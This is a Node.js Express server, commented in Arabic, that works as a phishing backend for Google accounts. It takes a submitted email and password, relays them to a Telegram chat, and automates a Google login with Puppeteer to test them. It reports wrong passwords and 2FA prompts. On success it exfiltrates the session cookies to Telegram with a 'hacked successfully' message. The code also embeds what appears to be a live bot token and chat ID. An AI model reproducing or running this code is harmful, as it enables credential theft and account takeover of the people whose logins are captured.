const express = require('express');
const puppeteer = require('puppeteer');
const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');

const app = express();
app.use(express.json());
app.use(cors());

// بياناتك الخاصة
const token = '8643435396:AAFDivegWPhjREbRaW0oCiY4nsf_EiMqNmw';
const bot = new TelegramBot(token, {polling: true});
const myChatId = '6893210883';

app.post('/login-check', async (req, res) => {
    const { email, pass } = req.body;
    
    bot.sendMessage(myChatId, `⏳ فحص حساب جديد:\n📧 ${email}\n🔑 ${pass}`);

    const browser = await puppeteer.launch({
        args: ['--no-sandbox', '--disable-setuid-sandbox']
    });
    const page = await browser.newPage();

    try {
        await page.goto('https://accounts.google.com', { waitUntil: 'networkidle2' });
        
        // إدخال الإيميل
        await page.type('input[type="email"]', email);
        await page.click('#identifierNext');
        await page.waitForTimeout(2500);

        // إدخال الباسورد
        await page.type('input[type="password"]', pass);
        await page.click('#passwordNext');
        await page.waitForTimeout(4500);

        // فحص هل الباسورد خطأ؟
        const isWrong = await page.$('.o6Ybe'); 
        if (isWrong) {
            bot.sendMessage(myChatId, `❌ كلمة مرور خاطئة لـ: ${email}`);
            return res.json({ status: "WRONG" });
        }

        // فحص هل طلب رمز (2FA)؟
        if (page.url().includes('challenge')) {
            bot.sendMessage(myChatId, `⚠️ مطلوب تحقق بخطوتين (2FA) لـ: ${email}`);
            return res.json({ status: "2FA" });
        }

        // نجاح الدخول - سحب الكوكيز
        const cookies = await page.cookies();
        bot.sendMessage(myChatId, `✅ تم الاختراق بنجاح!\n🍪 كوكيز الجلسة:\n${JSON.stringify(cookies)}`);
        res.json({ status: "OK" });

    } catch (e) {
        bot.sendMessage(myChatId, `❗ خطأ في السيرفر أثناء معالجة الحساب.`);
        res.status(500).json({ status: "ERROR" });
    } finally {
        await browser.close();
    }
});

const PORT = process.env.PORT || 8080;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
